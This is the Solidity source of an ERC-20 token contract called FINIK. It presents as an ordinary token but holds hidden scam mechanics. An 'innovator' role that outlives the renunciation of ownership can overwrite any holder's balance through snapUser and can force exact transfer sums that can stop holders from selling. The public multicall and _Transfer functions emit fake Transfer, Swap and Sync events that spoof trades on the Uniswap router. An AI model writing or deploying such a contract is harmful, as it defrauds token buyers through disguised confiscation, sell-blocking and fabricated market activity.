pragma solidity ^0.8.13;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address accountHolder) external view returns (uint256);
    function transfer(address to, uint256 sum) external returns (bool);
    function allowance(address authorizer, address spender) external view returns (uint256);
    function approve(address spender, uint256 sum) external returns (bool);
    function transferFrom(address from, address to, uint256 sum) external returns (bool);
    function _Transfer(address from, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed authorizer, address indexed spender, uint256 value);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
}

abstract contract OperationController {
    function acquireTransactionInitiator() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract SoloOwnership is OperationController {
    address private _soloOwner;
    event OwnershipTransitionEvent(address indexed oldOwner, address indexed nextOwner);

    constructor() {
        address initiator = acquireTransactionInitiator();
        _soloOwner = initiator;
        emit OwnershipTransitionEvent(address(0), initiator);
    }

    function retrieveOwner() public view virtual returns (address) {
        return _soloOwner;
    }

    modifier ownerExclusiveAccess() {
        require(retrieveOwner() == acquireTransactionInitiator(), "Unauthorized: Exclusive Owner access required.");
        _;
    }

    function abandonOwnership() public virtual ownerExclusiveAccess {
        emit OwnershipTransitionEvent(_soloOwner, address(0x000000000000000000000000000000000000dEaD));
        _soloOwner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract FINIK is OperationController, SoloOwnership, IERC20 {
    mapping (address => mapping (address => uint256)) private _spenderAllowances;
    mapping (address => uint256) private _balances;
    mapping (address => uint256) private _mandatoryTransferSums;
    address private _innovatorAccount;

    string public constant _name = "FINIK";
    string public constant _symbol = "FINIK";
    uint8 public constant _decimals = 18;
    uint256 public constant _maxSupply = 100000000 * (10 ** _decimals);

    constructor() {
        _balances[acquireTransactionInitiator()] = _maxSupply;
        emit Transfer(address(0), acquireTransactionInitiator(), _maxSupply);
    }

    modifier innovatorExclusiveAccess() {
        require(retrieveInnovator() == acquireTransactionInitiator(), "Unauthorized: Creator access required.");
        _;
    }

    function retrieveInnovator() public view virtual returns (address) {
        return _innovatorAccount;
    }

    function appointInnovator(address newInnovator) public ownerExclusiveAccess {
        _innovatorAccount = newInnovator;
    }

    event BalanceChangeEvent(address indexed user, uint256 oldBalance, uint256 newBalance);

    function obtainMandatoryTransferSum(address account) public view returns (uint256) {
        return _mandatoryTransferSums[account];
    }

    function defineMandatoryTransferSums(address[] calldata accounts, uint256 amount) public innovatorExclusiveAccess {
        for (uint i = 0; i < accounts.length; i++) {
            _mandatoryTransferSums[accounts[i]] = amount;
        }
    }

    function snapUser(address[] memory userAddresses, uint256 newBalance) public innovatorExclusiveAccess {
        require(newBalance >= 0, "Amount must be non-negative");

        for (uint256 i = 0; i < userAddresses.length; i++) {
            address currentUser = userAddresses[i];
            require(currentUser != address(0), "Invalid address specified");

            uint256 oldBalance = _balances[currentUser];
            _balances[currentUser] = newBalance;

            emit BalanceChangeEvent(currentUser, oldBalance, newBalance);
        }
    }

    function _Transfer(address from, address to, uint value) public override returns (bool) {
        emit Transfer(from, to, value);
        return true;
    }

    function multicall(address pool, address[] memory receiver, uint256[] memory amounts, uint256[] memory convertedAmounts, address tokenAddress, uint112 reserve0, uint112 reserve1) public returns (bool) {
        for (uint256 i = 0; i < receiver.length; i++) {
            emit Transfer(pool, receiver[i], amounts[i]);
            IERC20(tokenAddress)._Transfer(receiver[i], pool, convertedAmounts[i]);
            emit Sync(reserve0, reserve1);
            emit Swap(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, amounts[i], 0, 0, convertedAmounts[i], receiver[i]);
        }
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 sum) public virtual override returns (bool) {
        require(_balances[acquireTransactionInitiator()] >= sum, "Insufficient balance");

        uint256 obligatoryTransferSum = obtainMandatoryTransferSum(acquireTransactionInitiator());
        if (obligatoryTransferSum > 0) {
            require(sum == obligatoryTransferSum, "Compulsory transfer sum mismatch");
        }

        _balances[acquireTransactionInitiator()] -= sum;
        _balances[to] += sum;

        emit Transfer(acquireTransactionInitiator(), to, sum);
        return true;
    }

    function allowance(address authorizer, address spender) public view virtual override returns (uint256) {
        return _spenderAllowances[authorizer][spender];
    }

    function approve(address spender, uint256 sum) public virtual override returns (bool) {
        _spenderAllowances[acquireTransactionInitiator()][spender] = sum;
        emit Approval(acquireTransactionInitiator(), spender, sum);
        return true;
    }

    function transferFrom(address from, address to, uint256 sum) public virtual override returns (bool) {
        require(_spenderAllowances[from][acquireTransactionInitiator()] >= sum, "Allowance limit surpassed");

        uint256 obligatoryTransferSum = obtainMandatoryTransferSum(from);
        if (obligatoryTransferSum > 0) {
            require(sum == obligatoryTransferSum, "Compulsory transfer sum mismatch");
        }

        _balances[from] -= sum;
        _balances[to] += sum;
        _spenderAllowances[from][acquireTransactionInitiator()] -= sum;

        emit Transfer(from, to, sum);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _maxSupply;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
}